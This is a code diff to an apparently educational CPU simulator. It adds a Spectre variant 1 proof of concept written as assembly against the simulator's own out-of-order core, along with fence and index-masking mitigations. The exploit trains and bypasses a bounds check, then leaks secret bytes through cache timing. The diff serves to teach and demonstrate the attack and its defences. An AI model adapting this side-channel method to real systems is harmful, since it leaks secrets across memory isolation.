@@ -16,7 +16,7 @@ import re
 
 import numpy as np
 
-from .isa import IO_CONSOLE, IO_TAPE
+from .isa import IO_BASE, IO_CONSOLE, IO_TAPE
 
 SUM = """
         li   a0, 10          # n
@@ -616,3 +616,93 @@ pend:   li   a5, 10
         .align 4
 pow10:  .word 1000000000, 100000000, 10000000, 1000000, 100000, 10000, 1000, 100, 10, 1, 0
 """
+
+
+# ---------------------------------------------------------------------------
+# Part 8: Spectre, variant 1 (Kocher et al., 2019), against Pebble's out-of-order core
+# ---------------------------------------------------------------------------
+SPECTRE_ARRAY1 = 0x4000  # 16 bytes the victim may read, all zero; the secret follows in the same 64-byte line
+SPECTRE_SIZE = 0x5000  # the victim's bound, on a line of its own
+SPECTRE_PROBE = 0x10000  # 256 lines of 64 bytes: one per possible byte value
+
+
+def spectre(n_secret: int, mitigation: str | None = None, train: int = 6) -> str:
+    """Leak ``n_secret`` bytes stored after array1 through a bounds check, one byte a round:
+
+    train the check with in-bounds calls; flush the bound from the cache, so the check takes a whole memory access;
+    call with an out-of-bounds index; then time a read of every probe line, and print the index of the fastest.
+    ``mitigation``: "fence" puts a speculation barrier (a read of the cycle counter) after the check; "mask" clamps
+    the index with arithmetic that depends on the bound (Linux's array_index_nospec)."""
+    if mitigation == "fence":
+        guard = """        lw   t3, 8(a5)           # a barrier: nothing younger runs until the check has committed
+"""
+    elif mitigation == "mask":
+        guard = """        sltu t3, a0, t2          # 1 if in bounds
+        sub  t3, zero, t3        # all ones if in bounds, else zero
+        and  a0, a0, t3          # an out-of-bounds index becomes 0, even on a wrong path
+"""
+    else:
+        guard = ""
+    return f"""
+        li   s0, {SPECTRE_ARRAY1}
+        li   s1, {SPECTRE_SIZE}
+        li   s2, {SPECTRE_PROBE}
+        li   a5, {IO_BASE:#x}
+        li   a1, 0               # which secret byte
+        li   a2, {n_secret}
+        li   t1, 256
+rounds: beq  a1, a2, done
+        li   t0, 0               # flush the probe lines
+flush:  slli t2, t0, 6
+        add  t2, t2, s2
+        sw   t2, 12(a5)          # (model device) evict this line
+        addi t0, t0, 1
+        bne  t0, t1, flush
+        li   t0, {train}         # train the bounds check: in-bounds calls
+train:  andi a0, t0, 15
+        call victim
+        addi t0, t0, -1
+        bnez t0, train
+        sw   s1, 12(a5)          # evict the bound: the next check waits for memory
+        lw   t2, 8(a5)           # a barrier, so the eviction happens before the call (x86 needs mfence here)
+        addi a0, a1, 16          # the attack: an index past the end of array1
+        call victim
+        li   t0, 1               # time every probe line but line 0 (array1 holds zeros)
+        li   a3, 0x7fffffff
+        li   a4, 0
+time:   slli t2, t0, 6
+        add  t2, t2, s2
+        lw   t3, 8(a5)           # the cycle counter
+        lbu  a0, 0(t2)
+        lw   a0, 8(a5)
+        sub  a0, a0, t3
+        bgeu a0, a3, slower
+        mv   a3, a0
+        mv   a4, t0
+slower: addi t0, t0, 1
+        bne  t0, t1, time
+        sb   a4, 0(a5)           # print the byte whose line was fast
+        addi a1, a1, 1
+        j    rounds
+done:   halt
+victim: lw   t2, 0(s1)           # array1_size
+        bgeu a0, t2, out         # the bounds check
+{guard}        add  t3, s0, a0
+        lbu  t3, 0(t3)           # array1[x]
+        slli t3, t3, 6
+        add  t3, t3, s2
+        lbu  t3, 0(t3)           # probe[array1[x] * 64]
+out:    ret
+"""
+
+
+def spectre_image(secret: bytes, mitigation: str | None = None, train: int = 6) -> bytes:
+    """The assembled attack with its data: array1 (zeros), the secret after it, and the bound 16."""
+    from .asm import assemble
+
+    img = bytearray(assemble(spectre(len(secret), mitigation, train)).image)
+    img.extend(bytes(max(0, SPECTRE_SIZE + 4 - len(img))))
+    img[SPECTRE_ARRAY1 + 16: SPECTRE_ARRAY1 + 16 + len(secret)] = secret
+    img[SPECTRE_SIZE: SPECTRE_SIZE + 4] = (16).to_bytes(4, "little")
+    return bytes(img)
+
